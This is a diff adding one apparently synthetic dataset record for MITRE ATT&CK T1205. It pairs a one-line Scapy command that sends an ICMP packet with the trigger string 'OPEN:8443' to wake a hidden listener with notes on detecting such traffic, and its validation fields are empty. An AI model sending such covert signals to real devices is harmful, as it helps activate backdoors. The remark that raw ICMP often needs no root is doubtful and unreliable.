@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c \"from scapy.all import *; send(IP(dst='203.0.113.1')/ICMP()/Raw(load=b'OPEN:8443'), verbose=False)\"",
+  "explanation": "Crafts and transmits an ICMP echo containing a magic payload 'OPEN:8443' that a malicious listener can use as a covert signal to enable TCP/8443 temporarily. Sending raw ICMP typically does not require root when using Scapy send() on many systems but sudo ensures capability on network devices. Detection: inspect ICMP payloads for suspicious ASCII commands and unusual ICMP rates to infrastructure IPs.",
+  "rationale_steps": [
+    "Use Scapy to generate a benign-looking ICMP packet.",
+    "Embed a magic string that acts as the signaling token.",
+    "Transmit to the device intended to react to the signal.",
+    "Detection: DPI/IDS rules to match 'OPEN:' patterns in ICMP payloads and flag non-diagnostic ICMP traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-bba1a632-8558db45",
+  "source_prompt_hash": "bba1a632",
+  "timestamp_utc": "2025-09-30T05:49:31.290544Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
